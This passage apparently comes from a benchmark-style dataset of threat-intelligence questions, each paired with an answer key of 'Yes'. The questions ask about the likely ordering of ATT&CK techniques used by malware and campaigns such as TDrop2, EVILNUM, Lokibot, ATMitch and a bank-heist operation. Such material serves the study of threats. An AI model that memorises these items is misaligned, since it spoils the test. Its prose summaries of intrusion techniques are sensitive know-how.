Collection: LightNeuron can collect all emails matching specified rules in its configuration, as well as exfiltrate any local file using a backdoor function. This behavior corresponds to MITRE ATT&CK techniques T1114, Email Collection, and T1005, Data from Local System. Additionally, LightNeuron can automatically collect files from a specific path, which is related to MITRE ATT&CK technique T1119, Automated Collection.
Exfiltration: Data exfiltration is conducted through the email C&C channel (MITRE ATT&CK technique T1041, Exfiltration Over Command and Control Channel) and can be scheduled to occur during the night or working hours (MITRE ATT&CK technique T1029, Scheduled Transfer). The data is encrypted using AES (MITRE ATT&CK technique T1022, Data Encrypted).",Yes,ESET-LightNeuron
2383,394,394-Reconnaissance-T1591-Gather Victim Org Information,"After conducting initial access via spear-phishing emails with trojanized installation executables, is it likely that the malware TDrop2 would perform execution using process hollowing to evade detection before engaging in discovery activities such as gathering system information and network views?","Reconnaissance: The CTI report by Bryan Lee and Josh Grunzweig from Palo Alto Networks' Unit 42, dated November 18, 2015, indicates that the Dark Seoul attackers, also known as Operation Troy, have resurfaced. The attackers conducted reconnaissance by using malware to perform basic reconnaissance on the infected host and return the results to the attacker. The malware executed commands to gather system information, network views, TCP connections, task lists, and directory listings from specific paths on the host system.","Initial Access: The report suggests that the initial access vector for the new campaign was likely a spear-phishing email. The attackers used a trojanized version of a legitimate software installation executable hosted by a company in the industrial control systems sector. The executable, while installing the legitimate video player software, also infected the system with malware.
Execution: The malware, named TDrop2, executed a legitimate Microsoft Windows executable from the system32 folder and then used process hollowing to inject malicious code into the process. This technique allowed the malware to evade detection and execute the second-stage payload.
Defense Evasion: The TDrop2 malware used process hollowing and obfuscated its second-stage payload retrieval by disguising it as an image file. The C2 server replaced the first two bytes of the payload with 'DW' instead of 'MZ' to evade network security solutions. The dropper would then restore the initial bytes before executing the payload.
Discovery: The malware performed discovery activities by executing commands to collect information about the infected host. This included system information, network views, TCP connections, task lists, and directory listings from specific paths.
Command and Control: The malware communicated with C2 servers using encrypted and encoded commands. The encryption used an unidentified cryptographic routine, and the data was base64 encoded with a custom alphabet. The C2 servers were compromised websites located in South Korea and Europe.
Others: The CTI report details the similarities between the new TDrop2 malware variant and the original Dark Seoul/Operation Troy toolset. The malware used a custom base64 alphabet and a distinct string decryption routine observed in previous Operation Troy samples. The report also mentions that the C2 servers used in the recent attacks were compromised websites, which may have been due to vulnerabilities or misconfigurations. The report raises the possibility that the same groups responsible for the original attacks are behind this new campaign, although there is no conclusive evidence at this time.",Yes,tdrop2-attacks-suggest-dark-seoul-attackers-return
2385,394,394-Initial Access-T1566-Phishing,"After conducting reconnaissance to gather system information, network views, TCP connections, task lists, and directory listings from specific paths on the host system, is it likely that the Dark Seoul attackers used spear-phishing emails to deliver a trojanized version of a legitimate software installation executable for initial access?","Initial Access: The report suggests that the initial access vector for the new campaign was likely a spear-phishing email. The attackers used a trojanized version of a legitimate software installation executable hosted by a company in the industrial control systems sector. The executable, while installing the legitimate video player software, also infected the system with malware.","Reconnaissance: The CTI report by Bryan Lee and Josh Grunzweig from Palo Alto Networks' Unit 42, dated November 18, 2015, indicates that the Dark Seoul attackers, also known as Operation Troy, have resurfaced. The attackers conducted reconnaissance by using malware to perform basic reconnaissance on the infected host and return the results to the attacker. The malware executed commands to gather system information, network views, TCP connections, task lists, and directory listings from specific paths on the host system.
Execution: The malware, named TDrop2, executed a legitimate Microsoft Windows executable from the system32 folder and then used process hollowing to inject malicious code into the process. This technique allowed the malware to evade detection and execute the second-stage payload.
Defense Evasion: The TDrop2 malware used process hollowing and obfuscated its second-stage payload retrieval by disguising it as an image file. The C2 server replaced the first two bytes of the payload with 'DW' instead of 'MZ' to evade network security solutions. The dropper would then restore the initial bytes before executing the payload.
Discovery: The malware performed discovery activities by executing commands to collect information about the infected host. This included system information, network views, TCP connections, task lists, and directory listings from specific paths.
Command and Control: The malware communicated with C2 servers using encrypted and encoded commands. The encryption used an unidentified cryptographic routine, and the data was base64 encoded with a custom alphabet. The C2 servers were compromised websites located in South Korea and Europe.
Others: The CTI report details the similarities between the new TDrop2 malware variant and the original Dark Seoul/Operation Troy toolset. The malware used a custom base64 alphabet and a distinct string decryption routine observed in previous Operation Troy samples. The report also mentions that the C2 servers used in the recent attacks were compromised websites, which may have been due to vulnerabilities or misconfigurations. The report raises the possibility that the same groups responsible for the original attacks are behind this new campaign, although there is no conclusive evidence at this time.",Yes,tdrop2-attacks-suggest-dark-seoul-attackers-return
2389,394,394-Command and Control-T1001-Data Obfuscation,"After performing discovery activities to collect system and network information, is it likely that the TDrop2 malware will communicate with C2 servers using encrypted and base64-encoded commands by leveraging a custom base64 alphabet?","Command and Control: The malware communicated with C2 servers using encrypted and encoded commands. The encryption used an unidentified cryptographic routine, and the data was base64 encoded with a custom alphabet. The C2 servers were compromised websites located in South Korea and Europe.","Reconnaissance: The CTI report by Bryan Lee and Josh Grunzweig from Palo Alto Networks' Unit 42, dated November 18, 2015, indicates that the Dark Seoul attackers, also known as Operation Troy, have resurfaced. The attackers conducted reconnaissance by using malware to perform basic reconnaissance on the infected host and return the results to the attacker. The malware executed commands to gather system information, network views, TCP connections, task lists, and directory listings from specific paths on the host system.
Initial Access: The report suggests that the initial access vector for the new campaign was likely a spear-phishing email. The attackers used a trojanized version of a legitimate software installation executable hosted by a company in the industrial control systems sector. The executable, while installing the legitimate video player software, also infected the system with malware.
Execution: The malware, named TDrop2, executed a legitimate Microsoft Windows executable from the system32 folder and then used process hollowing to inject malicious code into the process. This technique allowed the malware to evade detection and execute the second-stage payload.
Defense Evasion: The TDrop2 malware used process hollowing and obfuscated its second-stage payload retrieval by disguising it as an image file. The C2 server replaced the first two bytes of the payload with 'DW' instead of 'MZ' to evade network security solutions. The dropper would then restore the initial bytes before executing the payload.
Discovery: The malware performed discovery activities by executing commands to collect information about the infected host. This included system information, network views, TCP connections, task lists, and directory listings from specific paths.
Others: The CTI report details the similarities between the new TDrop2 malware variant and the original Dark Seoul/Operation Troy toolset. The malware used a custom base64 alphabet and a distinct string decryption routine observed in previous Operation Troy samples. The report also mentions that the C2 servers used in the recent attacks were compromised websites, which may have been due to vulnerabilities or misconfigurations. The report raises the possibility that the same groups responsible for the original attacks are behind this new campaign, although there is no conclusive evidence at this time.",Yes,tdrop2-attacks-suggest-dark-seoul-attackers-return
2390,394,394-Command and Control-T1573-Encrypted Channel,"After performing discovery activities such as collecting system information, network views, TCP connections, task lists, and directory listings from specific paths, is it likely that the TDrop2 malware will communicate with C2 servers using an encrypted channel?","Command and Control: The malware communicated with C2 servers using encrypted and encoded commands. The encryption used an unidentified cryptographic routine, and the data was base64 encoded with a custom alphabet. The C2 servers were compromised websites located in South Korea and Europe.","Reconnaissance: The CTI report by Bryan Lee and Josh Grunzweig from Palo Alto Networks' Unit 42, dated November 18, 2015, indicates that the Dark Seoul attackers, also known as Operation Troy, have resurfaced. The attackers conducted reconnaissance by using malware to perform basic reconnaissance on the infected host and return the results to the attacker. The malware executed commands to gather system information, network views, TCP connections, task lists, and directory listings from specific paths on the host system.
Initial Access: The report suggests that the initial access vector for the new campaign was likely a spear-phishing email. The attackers used a trojanized version of a legitimate software installation executable hosted by a company in the industrial control systems sector. The executable, while installing the legitimate video player software, also infected the system with malware.
Execution: The malware, named TDrop2, executed a legitimate Microsoft Windows executable from the system32 folder and then used process hollowing to inject malicious code into the process. This technique allowed the malware to evade detection and execute the second-stage payload.
Defense Evasion: The TDrop2 malware used process hollowing and obfuscated its second-stage payload retrieval by disguising it as an image file. The C2 server replaced the first two bytes of the payload with 'DW' instead of 'MZ' to evade network security solutions. The dropper would then restore the initial bytes before executing the payload.
Discovery: The malware performed discovery activities by executing commands to collect information about the infected host. This included system information, network views, TCP connections, task lists, and directory listings from specific paths.
Others: The CTI report details the similarities between the new TDrop2 malware variant and the original Dark Seoul/Operation Troy toolset. The malware used a custom base64 alphabet and a distinct string decryption routine observed in previous Operation Troy samples. The report also mentions that the C2 servers used in the recent attacks were compromised websites, which may have been due to vulnerabilities or misconfigurations. The report raises the possibility that the same groups responsible for the original attacks are behind this new campaign, although there is no conclusive evidence at this time.",Yes,tdrop2-attacks-suggest-dark-seoul-attackers-return
2393,394,394-Discovery-T1049-System Network Connections Discovery,"After using process hollowing and obfuscating its second-stage payload as a form of defense evasion, is it likely that the TDrop2 malware will execute commands to collect TCP connections during its discovery activities before communicating with C2 servers using encrypted and encoded commands?","Discovery: The malware performed discovery activities by executing commands to collect information about the infected host. This included system information, network views, TCP connections, task lists, and directory listings from specific paths.","Reconnaissance: The CTI report by Bryan Lee and Josh Grunzweig from Palo Alto Networks' Unit 42, dated November 18, 2015, indicates that the Dark Seoul attackers, also known as Operation Troy, have resurfaced. The attackers conducted reconnaissance by using malware to perform basic reconnaissance on the infected host and return the results to the attacker. The malware executed commands to gather system information, network views, TCP connections, task lists, and directory listings from specific paths on the host system.
Initial Access: The report suggests that the initial access vector for the new campaign was likely a spear-phishing email. The attackers used a trojanized version of a legitimate software installation executable hosted by a company in the industrial control systems sector. The executable, while installing the legitimate video player software, also infected the system with malware.
Execution: The malware, named TDrop2, executed a legitimate Microsoft Windows executable from the system32 folder and then used process hollowing to inject malicious code into the process. This technique allowed the malware to evade detection and execute the second-stage payload.
Defense Evasion: The TDrop2 malware used process hollowing and obfuscated its second-stage payload retrieval by disguising it as an image file. The C2 server replaced the first two bytes of the payload with 'DW' instead of 'MZ' to evade network security solutions. The dropper would then restore the initial bytes before executing the payload.
Command and Control: The malware communicated with C2 servers using encrypted and encoded commands. The encryption used an unidentified cryptographic routine, and the data was base64 encoded with a custom alphabet. The C2 servers were compromised websites located in South Korea and Europe.
Others: The CTI report details the similarities between the new TDrop2 malware variant and the original Dark Seoul/Operation Troy toolset. The malware used a custom base64 alphabet and a distinct string decryption routine observed in previous Operation Troy samples. The report also mentions that the C2 servers used in the recent attacks were compromised websites, which may have been due to vulnerabilities or misconfigurations. The report raises the possibility that the same groups responsible for the original attacks are behind this new campaign, although there is no conclusive evidence at this time.",Yes,tdrop2-attacks-suggest-dark-seoul-attackers-return
2404,395,395-Collection-T1074-Data Staged,"After establishing communication with its C2 server periodically using one-way communications every 50 hours, is it likely that the EVILNUM agent will proceed to collect and stage data from the local system for exfiltration?","Collection: The agent collects data from the local system and stages it for exfiltration. It is capable of retrieving subsequent payloads, indicating it likely serves as a first stage agent.","Initial Access: Prevailion's Tailored Intelligence Team has detected two new criminal campaigns targeting the global financial industry with the EVILNUM malware, which began with a victim being enticed to follow a link to a file hosted on a widely-used cloud provider. The link led to a compressed folder containing trojanized files disguised as typical business interactions, part of 'Know Your Customer' banking procedures. These files used images of credit cards, driver's licenses, passports, and utility bills as decoys while executing a headless Javascript agent.
Execution: The EVILNUM malware, once executed, downloads a compressed folder with trojanized files that masquerade as PDFs and JPEGs. These files, when opened, display decoy images while running a script in the background. The script, written in Phantom for Windows OS, includes a function named 'DeleteLeftovers' to remove attack artifacts. The agent can upload and download files, run commands, steal cookies, access protected data, and is designed to persist through reboots by adding a registry key.
Persistence: The EVILNUM agent ensures persistence through reboots by adding a registry key. The registry key location is modified based on the antivirus product detected on the host machine. If BitDefender or Avast is detected, the registry key is created at HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\. Otherwise, it is created at HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows. The key runs a shortcut file that maps to the core agent script.
Defense Evasion: The EVILNUM malware uses various techniques to evade detection, including timestomping, modifying registry keys, and using hidden windows. It also includes logic to adapt its actions based on the antivirus products detected on the host machine. The malware removes artifacts of its presence and uses a one-way communication method to obtain the C2 address, making it elusive.
Credential Access: The EVILNUM agent has the capability to steal web session cookies, allowing it to access other protected data on the infected machine.
Command and Control: The agent communicates with a C2 server by sending a GET request to check.php and registers with the C2 to obtain a unique identifier. It periodically checks web pages every 50 hours for one-way communications containing the C2 node address. The C2 responds with tasks for the agent to execute.
Exfiltration: The agent exfiltrates data over the command and control channel, including uploading harvested cookies and downloading files from the C2.
Others: Prevailion has shared findings with Cyber Threat Alliance members to deploy protections and disrupt malicious cyber actors. Recommendations include disabling Microsoft shortcut files on high-risk machines, segmenting them within the network, and monitoring network logs for abnormal connections to IP addresses associated with virtual private servers.",Yes,Prevailion Blog_ Phantom in the Command Shell
2405,395,395-Exfiltration-T1041-Exfiltration Over C2 Channel,"After the EVILNUM agent stages collected data for exfiltration and communicates with the command and control server to register and receive tasks, is it likely that the agent will exfiltrate data over the C2 channel by uploading harvested cookies and downloading files from the C2?","Exfiltration: The agent exfiltrates data over the command and control channel, including uploading harvested cookies and downloading files from the C2.","Initial Access: Prevailion's Tailored Intelligence Team has detected two new criminal campaigns targeting the global financial industry with the EVILNUM malware, which began with a victim being enticed to follow a link to a file hosted on a widely-used cloud provider. The link led to a compressed folder containing trojanized files disguised as typical business interactions, part of 'Know Your Customer' banking procedures. These files used images of credit cards, driver's licenses, passports, and utility bills as decoys while executing a headless Javascript agent.
Execution: The EVILNUM malware, once executed, downloads a compressed folder with trojanized files that masquerade as PDFs and JPEGs. These files, when opened, display decoy images while running a script in the background. The script, written in Phantom for Windows OS, includes a function named 'DeleteLeftovers' to remove attack artifacts. The agent can upload and download files, run commands, steal cookies, access protected data, and is designed to persist through reboots by adding a registry key.
Persistence: The EVILNUM agent ensures persistence through reboots by adding a registry key. The registry key location is modified based on the antivirus product detected on the host machine. If BitDefender or Avast is detected, the registry key is created at HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\. Otherwise, it is created at HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows. The key runs a shortcut file that maps to the core agent script.
Defense Evasion: The EVILNUM malware uses various techniques to evade detection, including timestomping, modifying registry keys, and using hidden windows. It also includes logic to adapt its actions based on the antivirus products detected on the host machine. The malware removes artifacts of its presence and uses a one-way communication method to obtain the C2 address, making it elusive.
Credential Access: The EVILNUM agent has the capability to steal web session cookies, allowing it to access other protected data on the infected machine.
Collection: The agent collects data from the local system and stages it for exfiltration. It is capable of retrieving subsequent payloads, indicating it likely serves as a first stage agent.
Command and Control: The agent communicates with a C2 server by sending a GET request to check.php and registers with the C2 to obtain a unique identifier. It periodically checks web pages every 50 hours for one-way communications containing the C2 node address. The C2 responds with tasks for the agent to execute.
Others: Prevailion has shared findings with Cyber Threat Alliance members to deploy protections and disrupt malicious cyber actors. Recommendations include disabling Microsoft shortcut files on high-risk machines, segmenting them within the network, and monitoring network logs for abnormal connections to IP addresses associated with virtual private servers.",Yes,Prevailion Blog_ Phantom in the Command Shell
2410,396,396-Privilege Escalation-T1055-Process Injection,"After the malicious macro downloads and executes the second-stage downloader to fetch the encrypted third-stage payload, is Lokibot likely to escalate privileges by injecting a malicious DLL into Notepad.exe before employing process hollowing to bypass UAC?","Privilege Escalation: The third-stage deployment of Lokibot involves privilege escalation. The malware checks if a specific file exists and, if not, injects a malicious DLL into Notepad.exe. It uses a 'fileless' UAC bypass technique and, if necessary, another UAC bypass based on fodhelper.exe to create a directory and execute Lokibot with elevated privileges.","Initial Access: The Lokibot campaign begins with a phishing email containing a malicious XLS attachment. The email uses social engineering, presenting a message in Spanish about scheduled payment dates. The Excel sheet displays a blurred image, prompting users to enable macros, which triggers the execution of a malicious macro.
Execution: The malicious macro, once enabled, downloads a second-stage downloader. This downloader is heavily packed and fetches an encrypted third-stage, which includes the Lokibot malware. The infection chain involves multiple stages and layers of encryption to execute Lokibot on the victim's machine.
Defense Evasion: The Lokibot campaign employs defense evasion techniques such as process hollowing and code injection into a suspended process to bypass User Account Control (UAC).
Others: The Lokibot campaign utilizes a complex, multi-stage, multi-layered dropper to execute the malware. The adversaries behind Lokibot are capable of stealing multiple types of credentials and sensitive information. The campaign uses social engineering techniques to trick users into enabling macros, which leads to the execution of the malware. The infection chain is sophisticated, with three stages and three layers of encryption to hide the final payload. The dropper injects code into a suspended process to bypass UAC and uses process hollowing to execute its final payload. The blog post emphasizes the importance of a multi-layered security architecture to detect such attacks.",Yes,blog.talosintelligence.com-A Deep Dive into Lokibot Infection Chain
2414,398,398-Execution-T1072-Software Deployment Tools,"After gaining initial access through opportunistic phishing emails and creating backdoors on compromised systems, is it likely that the attackers leveraged control weaknesses in the Windows network to escalate privileges before executing malicious payloads including the installation of the 'Mipko' Employee Monitor tool?","Execution: The attackers executed several malicious payloads on the processor's network, including the installation of a legitimate monitoring tool, 'Mipko' (advertised as 'Employee Monitor'), on the processor's Terminal Server. This tool captured full information, including screen captures and keystrokes, for all users who logged into the system and accessed the card management application.","Initial Access: The cybercriminal network behind the attack recruited individuals, referred to as 'mules', to open new bank accounts using counterfeit documents likely provided by the network. These mules then requested debit/ATM cards for the new accounts, which were later distributed outside the country for subsequent fraudulent use. The attackers gained initial entry into the bank's network through opportunistic phishing emails to employees, which led to the creation of backdoors on compromised systems. Social engineering techniques were also employed to obtain backdoor access.
Privilege Escalation: After gaining initial access to the bank's network, the attackers leveraged control weaknesses in the Windows network to launch lateral movement attacks, obtain 'Keys to the Kingdom', and compromise the bank network. They also compromised the Enterprise Admin account on the processor's network, which gave them full access to the infrastructure.
Defense Evasion: Attackers adopted the tactic of 'living off the land', using legitimate Windows and PowerShell commands combined with tools such as PSExec for lateral movement, and plink.exe to access RDP over an established SSH tunnel. They also used commercial monitoring applications and 'Cobalt Strike Beacon' to maintain backdoor connections.
Credential Access: The attackers identified bank employee accounts on the card management application with authorization to request and approve changes to customer debit cards. They used these credentials to manipulate the cards associated with the rogue accounts created earlier.
Lateral Movement: The attackers compromised the third-party processor's network after numerous attempts, leveraging the bank's established connectivity with the processor. They used captured credentials to connect to the processor's network and executed reconnaissance of the card processing service.
Command and Control: The attackers coordinated ATM withdrawals across multiple cities and countries, using command and control with physical mules for coordinated cash outs. They carefully planned the choice of ATM locations based on criteria such as location, degree of physical security, and the ability to dispense substantial amounts of cash.
Impact: The attackers manipulated the bank's internal systems to enable high overdraft levels and removed anti-fraud controls for specific accounts. They then used the manipulated debit cards to perform cash withdrawals from various ATMs, removing up to USD$10 million from each bank. The final stage of the operation took almost five hours to complete, with simultaneous debit card withdrawals across the geographic region.",Yes,TW SpiderLabs Advanced Brief_Post-Soviet Bank Heists_PDF
2418,398,398-Privilege Escalation-T1078-Valid Accounts,"After gaining initial access through phishing emails that utilized social engineering to establish backdoors, is it likely that the attackers leveraged control weaknesses in the Windows network to launch lateral movement attacks and compromise the Enterprise Admin account, ultimately obtaining 'Keys to the Kingdom' and full access to the infrastructure to escalate their privileges?","Privilege Escalation: After gaining initial access to the bank's network, the attackers leveraged control weaknesses in the Windows network to launch lateral movement attacks, obtain 'Keys to the Kingdom', and compromise the bank network. They also compromised the Enterprise Admin account on the processor's network, which gave them full access to the infrastructure.","Initial Access: The cybercriminal network behind the attack recruited individuals, referred to as 'mules', to open new bank accounts using counterfeit documents likely provided by the network. These mules then requested debit/ATM cards for the new accounts, which were later distributed outside the country for subsequent fraudulent use. The attackers gained initial entry into the bank's network through opportunistic phishing emails to employees, which led to the creation of backdoors on compromised systems. Social engineering techniques were also employed to obtain backdoor access.
Execution: The attackers executed several malicious payloads on the processor's network, including the installation of a legitimate monitoring tool, 'Mipko' (advertised as 'Employee Monitor'), on the processor's Terminal Server. This tool captured full information, including screen captures and keystrokes, for all users who logged into the system and accessed the card management application.
Defense Evasion: Attackers adopted the tactic of 'living off the land', using legitimate Windows and PowerShell commands combined with tools such as PSExec for lateral movement, and plink.exe to access RDP over an established SSH tunnel. They also used commercial monitoring applications and 'Cobalt Strike Beacon' to maintain backdoor connections.
Credential Access: The attackers identified bank employee accounts on the card management application with authorization to request and approve changes to customer debit cards. They used these credentials to manipulate the cards associated with the rogue accounts created earlier.
Lateral Movement: The attackers compromised the third-party processor's network after numerous attempts, leveraging the bank's established connectivity with the processor. They used captured credentials to connect to the processor's network and executed reconnaissance of the card processing service.
Command and Control: The attackers coordinated ATM withdrawals across multiple cities and countries, using command and control with physical mules for coordinated cash outs. They carefully planned the choice of ATM locations based on criteria such as location, degree of physical security, and the ability to dispense substantial amounts of cash.
Impact: The attackers manipulated the bank's internal systems to enable high overdraft levels and removed anti-fraud controls for specific accounts. They then used the manipulated debit cards to perform cash withdrawals from various ATMs, removing up to USD$10 million from each bank. The final stage of the operation took almost five hours to complete, with simultaneous debit card withdrawals across the geographic region.",Yes,TW SpiderLabs Advanced Brief_Post-Soviet Bank Heists_PDF
2421,398,398-Lateral Movement-T1021-Remote Services,"After leveraging control weaknesses in the Windows network for privilege escalation and compromising the bank's Enterprise Admin account, is it likely that the attackers would compromise the third-party processor's network and use captured credentials to connect to the processor's network before conducting reconnaissance of the card processing service?","Lateral Movement: The attackers compromised the third-party processor's network after numerous attempts, leveraging the bank's established connectivity with the processor. They used captured credentials to connect to the processor's network and executed reconnaissance of the card processing service.","Initial Access: The cybercriminal network behind the attack recruited individuals, referred to as 'mules', to open new bank accounts using counterfeit documents likely provided by the network. These mules then requested debit/ATM cards for the new accounts, which were later distributed outside the country for subsequent fraudulent use. The attackers gained initial entry into the bank's network through opportunistic phishing emails to employees, which led to the creation of backdoors on compromised systems. Social engineering techniques were also employed to obtain backdoor access.
Execution: The attackers executed several malicious payloads on the processor's network, including the installation of a legitimate monitoring tool, 'Mipko' (advertised as 'Employee Monitor'), on the processor's Terminal Server. This tool captured full information, including screen captures and keystrokes, for all users who logged into the system and accessed the card management application.
Privilege Escalation: After gaining initial access to the bank's network, the attackers leveraged control weaknesses in the Windows network to launch lateral movement attacks, obtain 'Keys to the Kingdom', and compromise the bank network. They also compromised the Enterprise Admin account on the processor's network, which gave them full access to the infrastructure.
Defense Evasion: Attackers adopted the tactic of 'living off the land', using legitimate Windows and PowerShell commands combined with tools such as PSExec for lateral movement, and plink.exe to access RDP over an established SSH tunnel. They also used commercial monitoring applications and 'Cobalt Strike Beacon' to maintain backdoor connections.
Credential Access: The attackers identified bank employee accounts on the card management application with authorization to request and approve changes to customer debit cards. They used these credentials to manipulate the cards associated with the rogue accounts created earlier.
Command and Control: The attackers coordinated ATM withdrawals across multiple cities and countries, using command and control with physical mules for coordinated cash outs. They carefully planned the choice of ATM locations based on criteria such as location, degree of physical security, and the ability to dispense substantial amounts of cash.
Impact: The attackers manipulated the bank's internal systems to enable high overdraft levels and removed anti-fraud controls for specific accounts. They then used the manipulated debit cards to perform cash withdrawals from various ATMs, removing up to USD$10 million from each bank. The final stage of the operation took almost five hours to complete, with simultaneous debit card withdrawals across the geographic region.",Yes,TW SpiderLabs Advanced Brief_Post-Soviet Bank Heists_PDF
2422,398,398-Lateral Movement-T1550-Use Alternate Authentication Material,"After leveraging social engineering techniques to create backdoors during the initial access and executing malicious payloads such as deploying 'Mipko' for keystroke and screen capture monitoring, is it likely that the attackers leveraged captured credentials during lateral movement before coordinating ATM withdrawals using physical mules across multiple cities and countries?","Lateral Movement: The attackers compromised the third-party processor's network after numerous attempts, leveraging the bank's established connectivity with the processor. They used captured credentials to connect to the processor's network and executed reconnaissance of the card processing service.","Initial Access: The cybercriminal network behind the attack recruited individuals, referred to as 'mules', to open new bank accounts using counterfeit documents likely provided by the network. These mules then requested debit/ATM cards for the new accounts, which were later distributed outside the country for subsequent fraudulent use. The attackers gained initial entry into the bank's network through opportunistic phishing emails to employees, which led to the creation of backdoors on compromised systems. Social engineering techniques were also employed to obtain backdoor access.
Execution: The attackers executed several malicious payloads on the processor's network, including the installation of a legitimate monitoring tool, 'Mipko' (advertised as 'Employee Monitor'), on the processor's Terminal Server. This tool captured full information, including screen captures and keystrokes, for all users who logged into the system and accessed the card management application.
Privilege Escalation: After gaining initial access to the bank's network, the attackers leveraged control weaknesses in the Windows network to launch lateral movement attacks, obtain 'Keys to the Kingdom', and compromise the bank network. They also compromised the Enterprise Admin account on the processor's network, which gave them full access to the infrastructure.
Defense Evasion: Attackers adopted the tactic of 'living off the land', using legitimate Windows and PowerShell commands combined with tools such as PSExec for lateral movement, and plink.exe to access RDP over an established SSH tunnel. They also used commercial monitoring applications and 'Cobalt Strike Beacon' to maintain backdoor connections.
Credential Access: The attackers identified bank employee accounts on the card management application with authorization to request and approve changes to customer debit cards. They used these credentials to manipulate the cards associated with the rogue accounts created earlier.
Command and Control: The attackers coordinated ATM withdrawals across multiple cities and countries, using command and control with physical mules for coordinated cash outs. They carefully planned the choice of ATM locations based on criteria such as location, degree of physical security, and the ability to dispense substantial amounts of cash.
Impact: The attackers manipulated the bank's internal systems to enable high overdraft levels and removed anti-fraud controls for specific accounts. They then used the manipulated debit cards to perform cash withdrawals from various ATMs, removing up to USD$10 million from each bank. The final stage of the operation took almost five hours to complete, with simultaneous debit card withdrawals across the geographic region.",Yes,TW SpiderLabs Advanced Brief_Post-Soviet Bank Heists_PDF
2423,398,398-Impact-T1565-Data Manipulation,"After coordinating ATM withdrawals across multiple cities and countries using command and control with physical mules, is it likely that attackers will manipulate the bank's internal systems to enable high overdraft levels and remove anti-fraud controls before using the manipulated debit cards to perform cash withdrawals from various ATMs?","Impact: The attackers manipulated the bank's internal systems to enable high overdraft levels and removed anti-fraud controls for specific accounts. They then used the manipulated debit cards to perform cash withdrawals from various ATMs, removing up to USD$10 million from each bank. The final stage of the operation took almost five hours to complete, with simultaneous debit card withdrawals across the geographic region.","Initial Access: The cybercriminal network behind the attack recruited individuals, referred to as 'mules', to open new bank accounts using counterfeit documents likely provided by the network. These mules then requested debit/ATM cards for the new accounts, which were later distributed outside the country for subsequent fraudulent use. The attackers gained initial entry into the bank's network through opportunistic phishing emails to employees, which led to the creation of backdoors on compromised systems. Social engineering techniques were also employed to obtain backdoor access.
Execution: The attackers executed several malicious payloads on the processor's network, including the installation of a legitimate monitoring tool, 'Mipko' (advertised as 'Employee Monitor'), on the processor's Terminal Server. This tool captured full information, including screen captures and keystrokes, for all users who logged into the system and accessed the card management application.
Privilege Escalation: After gaining initial access to the bank's network, the attackers leveraged control weaknesses in the Windows network to launch lateral movement attacks, obtain 'Keys to the Kingdom', and compromise the bank network. They also compromised the Enterprise Admin account on the processor's network, which gave them full access to the infrastructure.
Defense Evasion: Attackers adopted the tactic of 'living off the land', using legitimate Windows and PowerShell commands combined with tools such as PSExec for lateral movement, and plink.exe to access RDP over an established SSH tunnel. They also used commercial monitoring applications and 'Cobalt Strike Beacon' to maintain backdoor connections.
Credential Access: The attackers identified bank employee accounts on the card management application with authorization to request and approve changes to customer debit cards. They used these credentials to manipulate the cards associated with the rogue accounts created earlier.
Lateral Movement: The attackers compromised the third-party processor's network after numerous attempts, leveraging the bank's established connectivity with the processor. They used captured credentials to connect to the processor's network and executed reconnaissance of the card processing service.
Command and Control: The attackers coordinated ATM withdrawals across multiple cities and countries, using command and control with physical mules for coordinated cash outs. They carefully planned the choice of ATM locations based on criteria such as location, degree of physical security, and the ability to dispense substantial amounts of cash.",Yes,TW SpiderLabs Advanced Brief_Post-Soviet Bank Heists_PDF
2428,399,399-Discovery-T1057-Process Discovery,"After leveraging defense evasion techniques to disguise its payload as a resource within a custom loader and inject it into the target process, is ATMitch likely to target the 'fwmain32.exe' process for process discovery before operating by reading commands from a file in the 'c:\intel' folder for command and control operations?","Discovery: ATMitch targets the 'fwmain32.exe' process, which is part of the software services produced by Wincor Nixdorf International GmbH, indicating the malware's awareness of its banking environment.","Initial Access: The ATMitch malware was manually installed on the victim ATM after a wide enterprise network intrusion, enabling cyber-criminals to manipulate the cash-withdrawal process.
Execution: The ATMitch malware, initially contained within a custom loader named 'tester.exe', injects the actual payload into the 'fwmain32.exe' process using the 'SetThreadContext' injection technique (Thread Hijacking).
Defense Evasion: The ATMitch malware disguises its payload as a resource within the loader and uses a thread hijacking technique to inject the payload into the target process, avoiding detection.
Command and Control: ATMitch does not exhibit typical command and control traffic; instead, it operates by reading commands from a file in the 'c:\intel' folder and logs actions into 'c:\intel\__log.txt'.
Impact: ATMitch interacts with ATM drivers to retrieve information about the current amount and dispense money, using the 'msxfs.dll' library to communicate with ATM components such as the PIN pad and cash dispenser.
Others: The ATMitch malware sample was discovered to be potentially active since 2017 and may be related to the APT group responsible for a previous compromise of a Russian bank. The malware requires the 'msxfs.dll' library to interact with ATM components and has a structured logging system. The attack flow involves manual installation via Remote Desktop, command execution, and log examination by the attacker.",Yes,ATMitch_ New Evidence Spotted In The Wild
2430,399,399-Impact-T1657-Financial Theft,"After targeting the 'fwmain32.exe' process to gather information about the banking environment, is it likely that ATMitch will interact with ATM drivers to dispense money using the 'msxfs.dll' library as part of its financial theft operation?","Impact: ATMitch interacts with ATM drivers to retrieve information about the current amount and dispense money, using the 'msxfs.dll' library to communicate with ATM components such as the PIN pad and cash dispenser.","Initial Access: The ATMitch malware was manually installed on the victim ATM after a wide enterprise network intrusion, enabling cyber-criminals to manipulate the cash-withdrawal process.
Execution: The ATMitch malware, initially contained within a custom loader named 'tester.exe', injects the actual payload into the 'fwmain32.exe' process using the 'SetThreadContext' injection technique (Thread Hijacking).
Defense Evasion: The ATMitch malware disguises its payload as a resource within the loader and uses a thread hijacking technique to inject the payload into the target process, avoiding detection.
Discovery: ATMitch targets the 'fwmain32.exe' process, which is part of the software services produced by Wincor Nixdorf International GmbH, indicating the malware's awareness of its banking environment.
Command and Control: ATMitch does not exhibit typical command and control traffic; instead, it operates by reading commands from a file in the 'c:\intel' folder and logs actions into 'c:\intel\__log.txt'.
Others: The ATMitch malware sample was discovered to be potentially active since 2017 and may be related to the APT group responsible for a previous compromise of a Russian bank. The malware requires the 'msxfs.dll' library to interact with ATM components and has a structured logging system. The attack flow involves manual installation via Remote Desktop, command execution, and log examination by the attacker.",Yes,ATMitch_ New Evidence Spotted In The Wild
